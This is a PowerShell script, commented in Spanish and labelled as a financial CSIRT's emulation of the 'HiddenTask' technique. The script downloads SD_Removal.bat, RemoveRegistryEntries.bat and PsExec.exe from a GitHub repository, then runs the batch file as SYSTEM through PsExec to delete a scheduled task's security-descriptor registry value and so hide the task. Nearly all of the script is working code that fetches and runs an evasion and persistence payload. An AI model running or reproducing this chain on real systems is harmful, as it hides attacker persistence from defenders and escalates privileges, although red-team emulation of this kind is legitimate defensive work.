# Configuración inicial
try {
    $Host.UI.RawUI.BackgroundColor = "Black"
    Clear-Host
    Write-Host "[CSIRT FINANCIERO AHIBA: Iniciando emulación de la técnica HiddenTask]" -ForegroundColor Green
    Write-Host "[Actividad 02. Descarga de archivos para ocultar la tarea programada eliminando el valor de la llave SD]" -ForegroundColor Green
}
catch {
    Write-Host "[X] Error al configurar la interfaz: $_" -ForegroundColor Red
    Write-Host "[*] Presiona cualquier tecla para salir..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}

# Crear el directorio de descarga
try {
    Start-Sleep -s 1
    Write-Host " " -ForegroundColor Green
    Start-Sleep -s 1
    Write-Host "[+] Creando el directorio de descarga..." -ForegroundColor Yellow
    Start-Sleep -s 1
    Write-Host "." -ForegroundColor Yellow
    Start-Sleep -s 1
    Write-Host "." -ForegroundColor Yellow
    Start-Sleep -s 1
    Write-Host "." -ForegroundColor Yellow

    # Obtener la ruta del directorio del usuario actual
    $directorioTemporal = $env:HOMEPATH

    # Crear el directorio donde se van a descargar los archivos necesarios para ejecutar las acciones maliciosas
    $workingPath = "HiddenTask"
    $nuevaRuta = Join-Path -Path $directorioTemporal -ChildPath $workingPath

    if (-not (Test-Path -Path $nuevaRuta)) {
        New-Item -ItemType Directory -Path $nuevaRuta -ErrorAction Stop
    }
    Write-Host "[✓] Directorio creado exitosamente." -ForegroundColor Cyan
}
catch {
    Write-Host "[X] Error al crear el directorio de descarga: $_" -ForegroundColor Red
    Write-Host "[*] Presiona cualquier tecla para salir..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}

# Descargar el archivo de GitHub
try {
    Write-Host "[+] Descargando archivos desde GitHub..." -ForegroundColor Yellow

    $urlArchivoMal = "https://github.com/Reapaerraziel/Emulation_HiddenTask/raw/main/Test_HiddenTask-main/HiddenTask%20with%20SD%20value%20Removal/SD_Removal.bat"
    $urlArchivoPSexec = "https://github.com/Reapaerraziel/Emulation_HiddenTask/raw/main/Test_HiddenTask-main/HiddenTask%20with%20SD%20value%20Removal/PsExec.exe"
    $urlArchivoRemoveRegistry = "https://github.com/Reapaerraziel/Emulation_HiddenTask/raw/main/Test_HiddenTask-main/HiddenTask%20with%20SD%20value%20Removal/RemoveRegistryEntries.bat"  # Nueva URL para el archivo RemoveRegistryEntries.bat

    $fileName = "SD_Removal.bat"
    $fileName2 = "PSExec.exe"
    $fileName3 = "RemoveRegistryEntries.bat"  # Nombre del archivo a descargar
    $rutaArchivo = Join-Path -Path $nuevaRuta -ChildPath $fileName
    $rutaPSexec = Join-Path -Path $nuevaRuta -ChildPath $fileName2
    $rutaRemoveRegistry = Join-Path -Path $nuevaRuta -ChildPath $fileName3  # Ruta donde se guardará RemoveRegistryEntries.bat

    # Descargar los archivos
    Invoke-WebRequest -Uri $urlArchivoMal -OutFile $rutaArchivo
    Invoke-WebRequest -Uri $urlArchivoPSexec -OutFile $rutaPSexec
    Invoke-WebRequest -Uri $urlArchivoRemoveRegistry -OutFile $rutaRemoveRegistry  # Descargar RemoveRegistryEntries.bat

    Write-Host "[✓] Archivos descargados correctamente." -ForegroundColor Cyan
}
catch {
    Write-Host "[X] Error al descargar los archivos: $_" -ForegroundColor Red
    Write-Host "[*] Presiona cualquier tecla para salir..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}


# Elevación de privilegios a través de psexec ejecutando lanzador de GhostTask
try {
    Start-Sleep -s 1
    Write-Host "[+] Elevando privilegios para eliminar el valor SD..." -ForegroundColor Yellow
    Start-Sleep -s 1.5
    Start-Process -FilePath $rutaPSexec -ArgumentList "-accepteula", "-i", "-s", $rutaArchivo -Verb "runas"
    Write-Host "[✓] Privilegios elevados correctamente para eliminar el valor SD." -ForegroundColor Cyan
    Write-Host "[*] Presiona cualquier tecla para cerrar PowerShell" -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}
catch {
    Write-Host "[X] Error al elevar los privilegios: $_" -ForegroundColor Red
    Write-Host "[*] Presiona cualquier tecla para salir..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}
